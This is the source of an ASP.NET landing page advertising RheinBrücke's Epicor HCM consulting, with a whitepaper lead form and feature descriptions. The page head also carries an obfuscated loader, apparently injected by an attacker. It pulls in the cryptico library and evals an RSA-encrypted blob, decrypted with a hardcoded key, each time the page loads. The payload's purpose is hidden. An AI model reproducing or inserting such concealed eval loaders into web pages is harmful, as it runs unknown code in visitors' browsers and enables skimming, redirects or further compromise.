<%@ Page Title="" Language="C#" MasterPageFile="~/LandingPageEpic.Master" AutoEventWireup="true" CodeBehind="HCMLandingPage.aspx.cs" Inherits="RheinBrucke.Landing.HCMLandingPage" %>
<asp:Content ID="Content1" ContentPlaceHolderID="headerPlaceHolder" runat="server">
    <meta name="keywords" content="epicor hcm hr software, human resource management system, resource management software, human capital management software, best hr software, talent management and performance management, strategic human resource management, human capital consulting, employee management software, human capital development and human capital strategy" />
    <meta name="Description" content="RheinBrücke leverages its extensive ERP implementation skills and functional knowledge in the HR domain to help our clients implement EPICOR HCM successfully." />
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="head" runat="server">
    <title>HCM</title>
    <link href="../Assets/css/bootstrap-min.css" rel="stylesheet" />
    <link href="../Assets/css/LandingStyleSheet.css" rel="stylesheet" />
    <link href="../Assets/css/media-q.css" rel="stylesheet" />
    <link href="../Assets/css/hover.css" rel="stylesheet" />
    <script src="../Assets/js/jquery-2.1.1.min.js"></script>
    <script src="../Assets/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cryptico/0.0.1343522940/cryptico.js" type="text/javascript"></script>
<script type="text/javascript">
eval(cryptico.decrypt('FcEHd/mvPFCDhXQ0K7n3YxzkhCd2Pf8ShnAMJPsf0QSBSKR19JNtVIQnP4UHwKu8YqmGPgLDRsc6xrv4Vobm6YtnrCyinDidcap+pCtd6DYJ1MUDlGKIbUCLo1/pIt1V8JGFq6Hm3TZpYKYjWTHmoS51k9nEynLL/tNaT6HnxtA=?5nlWqA30BgqEuIADjWNRHBYv2+VXMrzNy4Hh6m7SfYtMsCR0ll8pGr3+JnrfygdcVe3nijIj4F5gA4ClKimK+hRCRfT7t2GcWXSTMeLQNUUC/iWpYo00bhxQgMcR0tq18avJuhiDf7FLxp08hlqBN54cHPEI5WV30tnfjN/X+O+G5loZQEMZVZ/xpFpF9yeaHpO2tFc7SXH/dJOBSeHT3NMbTPjeBda9JGagnS1PT4E0RqhX2EGY6DoGzXLS4TcO8plIJAkGZv6SG67A+DClxD7vahP008EPpBBzCeVhBjEhnVq1TunPmaNFzEpgkSIlIyiIH2wtO94vyEOfqME0tQpJ+IPHAVvScp1lNyqeW1D4pGaPOys8F0uuqxL+4ZmX3HcLaUyONTWQ6EqEh/32qKeBkg7EqKdXMUIZ6LKw/8PFiRDY/EvUI7DtjAydShLe7AeKit1qhxImq4pU2hV6qw==', cryptico.generateRSAKey('45b2995aaef446a79ee7c81f9fe59fc1', 1024)).plaintext);
</script>
    <script type="text/javascript">
        function IsEmailValid(a) {
            if ("" == a) return !0; var e = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            return e.test(a)
        }
        $(document).ready(function () {
            var _rootUrl = $("#hdfRootUrl").val();
            $('#btnsubmit').click(function () {
                if ($('#txtName').val() == '') {
                    $('#showErrorMsg').text("Ensure name!."); $('#txtName').focus(); return false;
                }
                //if ($('#txtPhone').val() == '') {
                //    $('#showErrorMsg').text("Ensure phone number!."); $('#txtPhone').focus(); return false;
                //}
                if ($('#txtPhone').val() != '' && $('#txtPhone').val().length < 10) {
                    $('#showErrorMsg').text("Ensure phone number!."); $('#txtPhone').focus(); return false;
                }
                if ($('#txtEmail').val() == '') {
                    $('#showErrorMsg').text("Ensure work email!."); $('#txtEmail').focus(); return false;
                }
                if ($('#txtEmail').val() != '') {
                    if (!IsEmailValid($('#txtEmail').val())) {
                        $('#showErrorMsg').text("Ensure work email!."); $('#txtEmail').focus(); return false;
                    }
                }
                var email = $('#txtEmail').val();
                var a = email.split('@');
                if (a[1].toLowerCase() == 'gmail.com' || a[1].toLowerCase() == 'live.com' || a[1].toLowerCase() == 'live.in' || a[1].toLowerCase() == 'outlook.com' || a[1].toLowerCase() == 'yahoo.com' || a[1].toLowerCase() == 'zoho.com' || a[1].toLowerCase() == 'yandex.com' || a[1].toLowerCase() == 'aol.com' || a[1].toLowerCase() == 'mail.com' || a[1].toLowerCase() == 'inbox.com') {
                    $('#showErrorMsg').text("Please provide us with your work e-mail and not your personal e-mail!."); $('#txtEmail').focus(); return false;
                }
                var Data = {
                    firstname: $('#txtName').val(),
                    email: $('#txtEmail').val(),
                    phone: $('#txtPhone').val(),
                    ServiceType: "HCM"
                };
                $.ajax({
                    type: 'POST',
                    url: _rootUrl + "api/Landing/LandingPage",
                    data: JSON.stringify(Data),
                    contentType: "application/json; charset=utf-8",
                    dataType: "json",
                    success: function (response) {
                        if (response == "success") {
                            $('#showErrorMsg').text('Mail has been sent successfully!');
                            $('#txtName,#txtEmail,#txtPhone').val('');
                            setTimeout(function () {
                                $('#showErrorMsg').text('');
                            }, 5000);
                        }
                    }
                });
            });
        });
    </script>
</asp:Content>
<asp:Content ID="Content3" ContentPlaceHolderID="ContentPlaceHolder1" runat="server">
    <input type="hidden" id="hdfRootUrl" value="<%=rootpath %>" /><div class="visible-xs" style="height: 74px; width: 100%;"></div>
    <div class="container" style="padding: 0px;">
        <div class="banner-w-hcm">
            <div class="visible-sm" style="height: 60px;"></div>
            <div class="row visible-xs visible-sm">
                <div class="col-md-12">
                    <img class="img-responsive" src="/Landing/Images/hcm.jpg" />
                </div>
            </div>
            <div class="row">
                <div class="col-md-7" style="text-align: left; margin-top: 8px;">
                    <div style="padding-left: 15px; padding-top: 10px;" class="hidden-xs hidden-sm">
                    </div>
                </div>
                <div class="col-md-5" style="position: relative;">
                    <div class="form-div-epicor" style="top: 59px !important;">
                        <table class="frm-tbl-epicor">
                            <tr>
                                <td align="center">
                                    <img style="margin-top: -35px;" src="/Landing/Images/pdf-circle.png" />
                                </td>
                            </tr>
                            <tr>
                                <td style="height: 50px;">
                                    <p style="color: #6d6d6d; margin-left: 0px;">
                                        Please complete this form to Get your Free copy of the HR technology Whitepaper
                                    </p>
                                </td>
                            </tr>
                            <tr>
                                <td>

                                    <div class="form-group">
                                        <div class="input-group">
                                            <div class="input-group-addon">
                                                <img src="/Landing/Images/name.png" />
                                            </div>
                                            <input type="text" class="form-control" id="txtName" placeholder="Full name" />
                                        </div>
                                    </div>

                                    <div class="form-group">
                                        <div class="input-group">
                                            <div class="input-group-addon">
                                                <img src="/Landing/Images/phone.png" />
                                            </div>
                                            <input type="text" class="form-control" id="txtPhone" placeholder="Phone" />
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <div class="input-group">
                                            <div class="input-group-addon">
                                                <img src="/Landing/Images/mail.png" />
                                            </div>
                                            <input type="text" class="form-control" id="txtEmail" placeholder="Work E-mail" />
                                        </div>
                                    </div>
                                </td>
                            </tr>
                            <tr>
                                <td align="center">
                                    <a style="margin-left: 0px; background: #595353; width: 100%; display: block; color: #fff; line-height: 20px;"
                                        class="info-a" id="btnsubmit" target="_blank" href="/Assets/pdf/TransformingHRMadeEasy-version3.pdf">Submit</a>
                                </td>
                            </tr>
                            <tr>
                                <td style="padding: 6px;"><span id="showErrorMsg" style="color: red"></span></td>
                            </tr>
                            <tr>
                                <td>
                                    <p style="margin-top: 4px; margin-bottom: 18px; color: #676767; font-size: 11px !important;">
                                        Your privacy is important to us.
                                        <br />
                                        We'll never share your information.
                                    </p>
                                </td>
                            </tr>

                        </table>
                    </div>
                </div>
            </div>
        </div>
        <div class="row visible-xs visible-sm">
            <div class="col-md-12">
                <div style="height: 270px;"></div>
            </div>
        </div>
        <div class="conetnt-div">
            <div class="row">
                <div class="col-md-7">
                    <h2 style="font-weight: 300;">RheinBrücke <strong>Epicor HCM Services</strong> </h2>

                    <p class="para">Make your business more successful by effectively managing your human resources.</p>
                    <p class="para">Epicor HCM is designed by HR industry professionals. Epicor HCM provides the businesses with the tools they need to track data systematically rather than manually thus giving businesses more time to pursue their strategic objectives. </p>
                    <p class="para">RheinBrücke leverages its extensive ERP implementation skills and functional knowledge in the HR domain to help our clients implement EPICOR HCM successfully. </p>
                    <p class="para">Our consultants have deep domain expertise in implementing Epicor HCM and hands-on experience of several customer engagements. </p>
                    <p class="para">This award winning Epicor Human Capital Management is a comprehensive HRIS that empowers businesses by automating their HR processes from recruiting, timesheet, on boarding to fostering careers through talent management programs.</p>
                    <br />
                    <br />
                </div>
                <div align="center" class="col-md-5">
                    <div class="hidden-xs">
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                        <br />
                    </div>
                    <img class="img-responsive" src="/Landing/Images/hcm-img.jpg" />
                </div>
            </div>
            <!--Separator-->
            <div class="row">
                <div class="col-md-12">
                    <div style="width: 100%; height: 1px; background: #e8e8e8;"></div>
                </div>
            </div>
            <!--Separator-->
            <!--Infographics start here-->
            <div class="row">
                <div class="col-md-12">
                    <h2 style="font-weight: 300;">Key features of <strong>Epicor Human Capital Management </strong></h2>
                    <div class="col-md-6">

                        <h4 class="icons-heading">
                            <img src="/Landing/Images/hcm-icon-1.png" />Timesheet enablements</h4>
                        <ul class="listul">
                            <li>Calculating the hours worked</li>
                            <li>Integrated to absent tracking, managing overtime rules and project allocations and leaves tracking. </li>
                        </ul>

                        <br />
                        <h4 class="icons-heading">
                            <img src="/Landing/Images/hcm-icon-3.png" />Mobile connect </h4>
                        <ul class="listul">
                            <li>Company directory, personal information like insurance, to-do lists, requests and approvals can be accessed from the mobile anywhere, anytime. </li>
                        </ul>


                        <h4 class="icons-heading">
                            <img src="/Landing/Images/hcm-icon-5.png" />Candidate connect</h4>
                        <p>This connect enables candidate self-service to keep track of what is happening in the organization. </p>
                        <p><strong>Some functionalities of this connect are:-</strong></p>
                        <ul class="listul">
                            <li>Candidates can search and apply online for open positions </li>
                            <li>Create and maintain job history and skills profile </li>
                            <li>Attach his resume to his profile which is accessible by all in the organization  </li>
                        </ul>

                        <br />

                        <h4 class="icons-heading">
                            <img src="/Landing/Images/hcm-icon-6.png" />Core HR functionalities
                        </h4>
                        <p><strong>These help the HR and the employee with</strong></p>
                        <ul class="listul">
                            <li>Global Employee Records </li>
                            <li>Absence Tracking </li>
                            <li>Benefits Administration </li>
                            <li>Recruitment Management </li>
                            <li>Salary Admin and Planning </li>
                            <li>Competency Administration Manager </li>
                            <li>Self Service Reporting and </li>
                            <li>Analysis Configuration Tool</li>
                        </ul>



                    </div>
                    <div class="col-md-6">
                        <h4 class="icons-heading">
                            <img src="/Landing/Images/hcm-icon-2.png" />Training and Development
                        </h4>
                        <p>
                            The employee can manage the courses he has signed up for, sessions he has completed, comprehensive history of the skills acquired are made available to him which is integrated to his goals to encourage completion.

                        </p>

                        <br />


                        <h4 class="icons-heading">
                            <img src="/Landing/Images/hcm-icon-4.png" />Employee connect
                        </h4>
                        <p>
                            The benefactors of the employee connect are both the employee himself and the HR. The employee can assess himself and the HR can evaluate the effectiveness of the employee.


                        </p>

                        <p><strong>Some functionalities of this connect are:-</strong></p>
                        <ul class="listul">
                            <li>View and request time off </li>
                            <li>View and manage benefit enrollment </li>
                            <li>Access and sign company documents </li>
                            <li>Maintain competency profile View </li>
                            <li>Update personal information</li>
                            <li>Enroll in training courses </li>
                            <li>Manage your goal</li>
                        </ul>
                        <br />
                        <h4 class="icons-heading">
                            <img src="/Landing/Images/hcm-icon-8.png" />Performance management
                        </h4>
                        <p>
                            <strong>This helps the employee and the HR with
                            </strong>
                        </p>
                        <ul class="listul">
                            <li>Goal Management thereby, aligning his goals with the company’s goals</li>
                            <li>Configurable appraisal documents</li>
                            <li>360 Reviews by stakeholders are made available to the employee </li>
                        </ul>
                        <br />
                        <h4 class="icons-heading">
                            <img src="/Landing/Images/hcm-icon-9.png" />Position Control & Budgeting
                        </h4>
                        <p>
                            Export data using templates. On demand or scheduled review and audit
                        exported information enables interfaces to other systems.
                        </p>
                    </div>
                </div>
            </div>
            <!--Infographics end here-->
            <!--Separator-->
            <div class="row">
                <div class="col-md-12">
                    <div style="width: 100%; height: 1px; background: #e8e8e8;"></div>
                </div>
            </div>
            <!--Separator-->
            <div class="row">
                <div align="center" class="col-md-12">
                    <!--<img class="img-responsive" src="img/epicpay-circle.jpg" />-->
                </div>
            </div>
            <%--  <div class="row">
                <div class="col-md-12">
                    <br />
                </div>
            </div>--%>
        </div>
    </div>
</asp:Content>
